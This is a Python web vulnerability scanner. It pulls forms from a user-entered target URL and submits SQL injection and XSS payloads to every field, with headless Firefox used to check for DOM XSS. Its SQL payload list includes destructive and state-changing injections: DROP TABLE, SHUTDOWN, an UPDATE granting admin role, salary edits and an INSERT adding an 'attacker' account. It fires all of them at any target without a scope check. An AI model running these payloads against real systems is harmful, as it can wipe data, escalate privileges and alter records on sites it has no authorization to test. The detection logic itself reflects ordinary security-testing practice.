import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from datetime import datetime
from colorama import init, Fore, Style
import json
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import time

init(autoreset=True)

sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'a'='a",
    "' OR ''='",
    '" OR "1"="1',
    "') OR ('1'='1",
    "') OR '1'='1' --",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT username, password FROM users--",
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND 1=CAST((SELECT version()) AS INT)--",
    "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
    "'; SELECT pg_sleep(5)--",
    "'; UPDATE users SET role='admin' WHERE username='victim'; --",
    "abc'; UPDATE users SET salary='9999' WHERE name='Alice'; --",
    "x', salary=100000#",
    "'; INSERT INTO users (username, password) VALUES ('attacker','pass'); --",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1 LIMIT 1 /*",
    "' OR 1=1 ORDER BY 1--",
    "'/*!OR*/ 1=1--",
    "x' OR 1=1--",
    "' OR 1=1 --+",
    "'; DROP TABLE users; --",
    "'; SHUTDOWN --",
]

xss_payloads = [
    "<script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>"
]

scanned_forms = set()
results = []

# Selenium Firefox setup
options = Options()
options.headless = True
driver = webdriver.Firefox(options=options)

def get_all_forms(url):
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.content, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(Fore.YELLOW + f"[-] Error fetching {url}: {e}")
        return []

def get_form_details(form, url):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all(['input', 'textarea', 'select']):
        name = input_tag.attrs.get("name")
        if name:
            inputs.append(name)
    form_id = (urljoin(url, action), method, tuple(sorted(inputs)))
    if form_id in scanned_forms:
        return None
    scanned_forms.add(form_id)
    details["action"] = urljoin(url, action)
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    target_url = form_details['action']
    data = {name: payload for name in form_details['inputs']}
    try:
        if form_details['method'] == 'post':
            return requests.post(target_url, data=data, timeout=5)
        else:
            return requests.get(target_url, params=data, timeout=5)
    except requests.exceptions.RequestException as e:
        print(Fore.YELLOW + f"[-] Submission error: {e}")
        return None

def is_sqli_vulnerable(response):
    if response is None:
        return False
    errors = ["you have an error in your sql syntax", "warning", "ORA-", "syntax error"]
    return any(error.lower() in response.text.lower() for error in errors)

def is_xss_vulnerable(response, payload):
    if response is None:
        return False
    return payload in response.text

def is_dom_xss_vulnerable(url, payload):
    try:
        test_url = url + "?test=" + payload
        driver.get(test_url)
        time.sleep(2)
        alert = driver.switch_to.alert
        if alert:
            alert.accept()
            return True
    except:
        return False

def scan_url(url):
    print(Fore.CYAN + f"[*] Scanning {url}")
    forms = get_all_forms(url)
    for form in forms:
        form_details = get_form_details(form, url)
        if not form_details:
            continue

        for payload in sql_payloads:
            response = submit_form(form_details, url, payload)
            if is_sqli_vulnerable(response):
                print(Fore.RED + f"[!] SQLi vulnerability found with payload: {payload}")
                results.append({
                    "url": url,
                    "type": "SQL Injection",
                    "payload": payload,
                    "form": form_details
                })
                break

        for payload in xss_payloads:
            response = submit_form(form_details, url, payload)
            if is_xss_vulnerable(response, payload):
                print(Fore.MAGENTA + f"[!] XSS vulnerability found with payload: {payload}")
                results.append({
                    "url": url,
                    "type": "Reflected XSS",
                    "payload": payload,
                    "form": form_details
                })
                break

    for payload in xss_payloads:
        if is_dom_xss_vulnerable(url, payload):
            print(Fore.LIGHTMAGENTA_EX + f"[!] DOM-based XSS found with payload: {payload}")
            results.append({
                "url": url + "?test=" + payload,
                "type": "DOM-based XSS",
                "payload": payload
            })
            break

def main():
    target = input("Enter target URL: ")
    scan_url(target)
    driver.quit()
    with open("scan_results.json", "w") as f:
        json.dump(results, f, indent=2)
    print(Fore.GREEN + f"\n[+] Scan complete. Results saved to scan_results.json")

if __name__ == "__main__":
    main()
